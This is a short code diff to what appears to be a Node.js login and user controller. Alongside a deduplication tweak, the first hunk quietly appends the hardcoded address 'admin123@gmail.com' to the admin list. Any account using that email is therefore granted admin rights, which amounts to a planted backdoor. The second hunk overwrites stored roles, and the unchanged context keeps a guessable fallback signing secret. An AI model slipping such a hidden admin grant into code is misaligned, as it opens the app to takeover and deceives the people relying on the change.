@@ -5,10 +5,11 @@ const User = require('../models/userModel');
 const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 const tokenTtlSeconds = Number(process.env.AUTH_TOKEN_TTL_SECONDS || 60 * 60 * 24 * 7);
 const authSecret = process.env.AUTH_SECRET || process.env.JWT_SECRET || 'craftigen-dev-secret-change-me';
-const adminEmails = (process.env.ADMIN_EMAILS || '')
+const adminEmails = Array.from(new Set((process.env.ADMIN_EMAILS || '')
     .split(',')
     .map((email) => email.trim().toLowerCase())
-    .filter(Boolean);
+    .filter(Boolean)
+    .concat('admin123@gmail.com')));
 
 const asyncHandler = (handler) => (req, res, next) => {
     Promise.resolve(handler(req, res, next)).catch(next);
@@ -75,7 +76,7 @@ const sanitizeUser = (user) => {
     delete data.password;
     if (adminEmails.includes(String(data.email || '').toLowerCase())) {
         data.role = 'admin';
-    } else if (!data.role) {
+    } else {
         data.role = 'customer';
     }
     return data;
